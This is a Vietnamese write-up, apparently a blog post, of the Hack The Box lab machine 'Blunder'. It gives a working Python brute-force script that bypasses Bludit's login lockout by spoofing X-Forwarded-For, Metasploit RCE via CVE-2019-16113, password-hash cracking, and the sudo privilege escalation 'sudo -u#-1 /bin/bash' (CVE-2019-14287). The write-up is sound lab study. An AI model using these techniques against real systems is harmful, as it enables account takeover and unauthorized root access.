## 0. Mở đầu

![](https://images.viblo.asia/909d7d26-e36d-4b5e-a099-a56af5e91700.png)

Blunder là một machine được đánh giá easy, tại thời điểm mình làm bài thì nó đã ra được 58 ngày. Với base là Linux thì mình cũng quen thuộc hơn.

![](https://images.viblo.asia/a3ab41db-c92a-49cf-af7c-187c2e27a887.png)


Dựa vào matrix rate có thể thấy việc quan trọng nhất là recon và tìm ra được CVE của machine, kể cả là để RCE hay leo quyền! Với việc thiên hướng CVE như thế này thì cũng không quá khó hiểu khi machine được đánh giá "easy".

Start !

## 1. Write-up

Như mọi khi, sử dụng nmap trước:

```
nmap -Pn -n -v -sV -sS -T5 -p- -oN normal.txt 10.10.10.191
```

![](https://images.viblo.asia/65a40fd1-ad4b-473e-8f47-b1148aa7e273.png)

Chỉ có port 21 và 80, mà port 21 đã closed.

Như vậy chỉ có thể tập trung vào exploit Web.

Dùng gobuster để brute-force đường path, ra được một số thông tin có vẻ có thể dùng được.

![](https://images.viblo.asia/e67138b0-b0b0-48a0-822f-b18f34094612.png)


Nhưng dạo vòng quanh không thấy gì đặc sắc và có thể khai thác, admin/login cũng không dùng một số default credentials.

Vậy phải tìm lỗi dựa vào version 3.9.2:

![](https://images.viblo.asia/7df5064a-a1fc-4070-8ac9-ae0da6ce16dc.png)

Tìm được một số link, chủ yếu liên quan tới brute-force admin panel, có vẻ người chơi Hackthebox không thích các lỗi liên quan tới brute-force lắm, minh chứng là rate của bài chỉ ở 3.3 sao:

https://rastating.github.io/bludit-brute-force-mitigation-bypass/

Custom lại và chạy thử, password sử dụng của metasploit tại: /usr/share/wordlists/metasploit/unix_passwords.txt và một số password tại https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials 

nhưng không thành công.

Recon lại, tại todo.txt chúng ta có:

![](https://images.viblo.asia/c1ecb99b-4300-4bae-9a8e-aeb59644bce3.png)

Dùng **fergus** làm username và brute-force lại nhưng không được= > Thử tạo từ điển password riêng.

Sử dụng [cwel](https://tools.kali.org/password-attacks/cewl)

```
cewl -d 3 -m 5 -w passwd.txt http://10.10.10.191/
```

Đây là một công cụ tự động genarate password dựa vào những thông tin nó nhận được từ URL người dùng cung cấp. Là một tool rất hay và thú vị.

Mã exploit:

```python
#!/usr/bin/env python3
import re
import requests

host = "http://10.10.10.191" # change to the appropriate URL

login_url = host + '/admin/login'
username = 'fergus' # Change to the appropriate username
fname = "passwd.txt" #change this to the appropriate file you can specify the full path to the file
with open(fname) as f:
    content = f.readlines()
    word1 = [x.strip() for x in content] 
wordlist = word1

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```


Password đúng sau khi chạy script: **RolandDeschain**. Như này thì đúng là không biết phải thử đến bao giờ nếu không có công cụ **cewl** ở trên. Bằng một cách magic nào đó nó đã tạo ra được password kia !

![](https://images.viblo.asia/c5f1f818-9813-4ef1-91b9-4712fef6872f.png)

Sau khi login, tìm kiếm CVE của bludit 3.9.2. Có CVE liên quan tới RCE:

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113

Exploit sử dụng metasploit: 

![](https://images.viblo.asia/47a8b4f5-0f75-4b4c-aa8f-d5440918c96d.png)

Chúng ta có shell dưới quyền www-data:

![](https://images.viblo.asia/e75a14d7-e830-45ba-b3d6-7df1fb2c5805.png)

Lên tty shell: 

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

### User Flag

Tại **/var/www/bludit-3.10.0a/bl-content/databases**:

```
cat users.php
```

![](https://images.viblo.asia/f9e481a5-1477-4c45-b8f7-2b9b2d11653e.png)


Detect xem là loại mã hóa nào, đây là SHA-1:

![](https://images.viblo.asia/99cdf7cf-fc5c-4f8d-ad5b-32a386f61010.png)

Tại home chúng ta có 2 User:

![](https://images.viblo.asia/a24e53ac-4228-4286-ac6f-94aa5210e61b.png)

Crack password trên chúng ta có: Password120

![](https://images.viblo.asia/74ce83dc-92c3-49e7-b57a-0f3a52c3affd.png)

switch user sang hugo và lấy User flag:

![](https://images.viblo.asia/ed114ac5-2645-4a2f-a2bf-fe8e08eccb33.png)


## Root Flag

Check sudo rights trước:

![](https://images.viblo.asia/ed20e793-2efd-4cf4-b78a-5aece5905715.png)

CVE của **(ALL, !root) /bin/bash** có mã: CVE-2019-14287

exploit:

```
sudo -u#-1 /bin/bash
```

Và lấy root flag, như vậy có thể đánh giá là việc leo quyền trong bài này là rất nhanh và dễ.

![](https://images.viblo.asia/a35e2373-19aa-4994-8fca-b205901b609c.png)

## 2. Kết luận

Machine không khó, dựa vào các public resource có thể dễ dàng có Flag. Một bài tốt để bắt đầu...chơi lại HTB